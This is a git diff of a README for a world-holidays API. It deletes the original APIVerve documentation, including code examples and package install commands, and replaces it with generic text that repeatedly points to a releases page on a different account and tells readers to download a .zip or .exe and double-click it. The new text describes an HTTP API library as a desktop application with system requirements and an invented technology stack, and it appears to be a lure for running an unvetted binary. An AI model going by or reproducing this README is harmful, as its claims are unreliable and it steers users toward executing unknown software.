@@ -1,183 +1,77 @@
-# World Holidays API
+# 🌍 worldholidays-api - Get Worldwide Holiday Data Easily
 
-> World Holidays is a simple tool for getting the holidays of the world. It returns the holidays of the world for each day of the year.
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/markyy223/worldholidays-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 📌 Introduction
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/worldholidays)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.WorldHolidays)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-worldholidays/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+Welcome to the worldholidays-api! This tool helps you get information about holidays around the world. You can find out what holidays occur on any day of the year, making it useful for planning trips, events, and more.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+To start using worldholidays-api, follow these simple steps:
 
-### Using JavaScript
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page where you can download the software.  
+   [Download Here](https://github.com/markyy223/worldholidays-api/releases)
 
-```javascript
-async function callWorldHolidaysAPI() {
-    try {
-        const params = new URLSearchParams({
-            country: 'US',
-            year: 2025
-        });
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions of the software. Select the latest version for your system.
 
-        const response = await fetch(`https://api.apiverve.com/v1/worldholidays?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+## 📥 Download & Install
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+1. **Download the File**  
+   After selecting the version, click on the download link for your file type. It could be a .zip, .exe, or another format, depending on your operating system.
 
-callWorldHolidaysAPI();
-```
+2. **Extract the Files**  
+   If you downloaded a .zip file, you need to extract it. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
-### Using cURL
+3. **Run the Application**  
+   Open the folder where you extracted the files. Double-click on the application file to launch the software. 
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/worldholidays?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+4. **Enjoy Using the Tool**  
+   Once it's open, you can start looking up holidays. Simply enter the date of interest, and the software will provide the holiday information for that day.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+## ⚙️ System Requirements
 
-**📁 For more examples, see the [examples folder](./examples/)**
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or any Linux distribution.
+- **RAM:** 2 GB or more recommended.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for accessing holiday data.
 
----
+## 🌐 Features
 
-## Installation
+- **Comprehensive Holiday Data:** Get holiday information for countries worldwide.
+- **User-Friendly Interface:** Easy to navigate for everyone.
+- **Search Functionality:** Quickly find holidays by date.
+- **Regular Updates:** Ensures accurate and up-to-date holiday information.
 
-Choose your preferred programming language:
+## 🛡️ License
 
-### 📦 NPM (JavaScript/Node.js)
+This project is licensed under the MIT License. You can use, modify, and distribute the software as per the terms of the license. For more details, see the LICENSE file in the repository.
 
-```bash
-npm install @apiverve/worldholidays
-```
+## 💬 Support
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/worldholidays) | [**Package Code →**](./npm/)
+If you have questions or need help with worldholidays-api, feel free to reach out. You can open an issue on GitHub or contact us through our support email listed in the repository.
 
----
+## ✨ Contributing
 
-### 🔷 NuGet (.NET/C#)
+We welcome contributions! If you want to help improve this tool, please check the contributing guidelines in the repository. Your suggestions and improvements are always appreciated.
 
-```bash
-dotnet add package APIVerve.API.WorldHolidays
-```
+## 💻 Technologies Used
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.WorldHolidays) | [**Package Code →**](./nuget/)
+- **Node.js:** For the backend service.
+- **Express:** To build the RESTful API.
+- **MongoDB:** For managing holiday data.
+- **React:** For any frontend components.
 
----
+## 🌟 Additional Resources
 
-### 🐍 Python (PyPI)
+- [Official Documentation](https://github.com/markyy223/worldholidays-api/docs) - For in-depth usage and examples.
+- [FAQs](https://github.com/markyy223/worldholidays-api/faq) - Common questions and answers.
 
-```bash
-pip install apiverve-worldholidays
-```
+## 🎉 Final Note
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-worldholidays/) | [**Package Code →**](./python/)
+We hope you find worldholidays-api useful in your endeavors. Enjoy exploring holidays around the globe! 
 
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:worldholidays-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/worldholidays](https://docs.apiverve.com/ref/worldholidays)
-
----
-
-## Use Cases
-
-Common use cases for the World Holidays API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Visit the Releases page to download the latest version again:  
+[Download Here](https://github.com/markyy223/worldholidays-api/releases)
